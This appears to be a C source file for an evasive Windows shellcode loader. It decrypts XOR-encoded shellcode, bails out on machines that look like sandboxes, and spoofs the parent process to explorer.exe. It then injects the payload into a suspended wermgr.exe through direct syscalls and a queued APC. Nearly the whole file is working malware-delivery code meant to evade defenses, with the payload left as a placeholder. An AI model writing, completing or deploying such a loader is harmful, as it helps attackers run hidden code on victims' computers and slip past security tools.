// Project -> Properties -> Advanced -> Change "Character Set" to "Use Multi Byte Char. Set"
// Syswhisphers command: python syswhisphers.py --functions NtWriteVirtualMemory,NtDelayExecution,NtCreateSection,NtMapViewOfSection,NtQueueApcThread,NtResumeThread -o syscalls
// Inputs required: 1-XOR'd shellcode, 2-XOR Decryption Key

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>
#include "PPIDSpoof.h"
#include "LM.h"
#pragma comment(lib, "netapi32.lib")

// Initalize shellcode + XOR decryption key
unsigned char shellcode[] = { 0xaa, 0xab }; // INPUT 1: XOR SHELLCODE HERE
size_t shellcode_len = sizeof(shellcode);
char key[] = "ac"; // INPUT 2: DECRYPTION KEY

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	int j;
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}
}

DWORD GetPidByName(const char* pName) {
	PROCESSENTRY32 pEntry;
	HANDLE snapshot;

	pEntry.dwSize = sizeof(PROCESSENTRY32);
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snapshot, &pEntry) == TRUE) {
		while (Process32Next(snapshot, &pEntry) == TRUE) {
			if (_stricmp(pEntry.szExeFile, pName) == 0) {
				return pEntry.th32ProcessID;
			}
		}
	}
	CloseHandle(snapshot);
	return 0;
}

int main(void) {

	// --- Anti Sandboxing ---

	// Check if <4GB RAM
	MEMORYSTATUSEX totram;
	totram.dwLength = sizeof(totram);
	GlobalMemoryStatusEx(&totram);
	if ((float)totram.ullTotalPhys / 1073741824 < 4) {
		exit(0);
	}

	// Check if domain joined
	PWSTR domainName;
	NETSETUP_JOIN_STATUS status;
	NetGetJoinInformation(NULL, &domainName, &status);
	if (status != NetSetupDomainName) {
		exit(0);
	}

	// Check if <2 processors
	int minprocs = 2;
	SYSTEM_INFO sysinfo;
	GetSystemInfo(&sysinfo);
	int numprocs = sysinfo.dwNumberOfProcessors;
	if (numprocs < minprocs) {
		exit(0);
	}

	// --- PPID Spoofing ---
	STARTUPINFOEXA info;
	PROCESS_INFORMATION processInfo;
	SIZE_T cbAttributeListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	HANDLE hParentProcess = NULL;
	DWORD dwPid = 0;
	ZeroMemory(&info, sizeof(STARTUPINFOEXA));

	dwPid = GetPidByName("explorer.exe");
	if (dwPid == 0)
		dwPid = GetCurrentProcessId();

	// create fresh attributelist
	InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
	pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
	InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);

	// copy and spoof parent process ID
	hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	UpdateProcThreadAttribute(pAttributeList,
		0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		&hParentProcess,
		sizeof(HANDLE),
		NULL,
		NULL);

	info.lpAttributeList = pAttributeList;

	// launch new process with spoofed parent
	CreateProcessA(NULL,
		(LPSTR)"wermgr.exe",
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW | DETACHED_PROCESS | EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		&info.StartupInfo,
		&processInfo);

	// Clean up
	DeleteProcThreadAttributeList(pAttributeList);
	CloseHandle(hParentProcess);

	// --- Injection ---
	SIZE_T size = shellcode_len;
	LARGE_INTEGER sectionSize = { size };
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
	HANDLE curproc = GetCurrentProcess();

	// Create memory section (RWX)
	NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	
	// Create a view of the memory section in the local process (RW)
	NtMapViewOfSection(sectionHandle, curproc, &localSectionAddress, NULL, NULL, NULL, &size, (SECTION_INHERIT)2, NULL, PAGE_READWRITE);

	// Create a view of the memory section in the target process (RX)
	NtMapViewOfSection(sectionHandle, processInfo.hProcess, &remoteSectionAddress, NULL, NULL, NULL, &size, (SECTION_INHERIT)2, NULL, PAGE_EXECUTE_READ);

	// Decrypt payload
	XOR((char*)shellcode, shellcode_len, key, sizeof(key));

	// Copy shellcode to local view which reflects in target via the mapping
	SIZE_T byteswritten = 0;
	NtWriteVirtualMemory(curproc, localSectionAddress, shellcode, shellcode_len, &byteswritten);

	// Queue an APC call into the suspended process
	NtQueueApcThread(processInfo.hThread, (PKNORMAL_ROUTINE)remoteSectionAddress, NULL, NULL, NULL);

	// Resume the process
	NtResumeThread(processInfo.hThread, NULL);
	
	return 0;
}
